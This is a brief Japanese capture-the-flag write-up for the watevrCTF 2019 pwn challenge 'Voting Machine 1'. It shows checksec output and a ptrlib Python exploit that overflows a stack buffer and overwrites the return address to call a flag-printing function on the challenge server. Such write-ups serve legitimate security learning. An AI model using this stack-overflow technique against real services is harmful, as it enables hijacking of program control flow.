# [pwn 33pts] Voting Machine 1 - watevrCTF 2019
64ビットバイナリで、DEP以外無効です。
```
$ checksec -f kamikaze
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   74 Symbols     No       0               4       kamikaze
```
Stack Overflowがあり、フラグを表示する関数があるので呼びます。
```python
from ptrlib import *

elf = ELF("./kamikaze")
#sock = Process("./kamikaze")
sock = Socket("13.48.67.196", 50000)

payload = b'A' * 10
payload += p64(elf.symbol('super_secret_function'))
sock.sendlineafter("Vote: ", payload)

sock.interactive()
```

# 感想
簡単ですね。
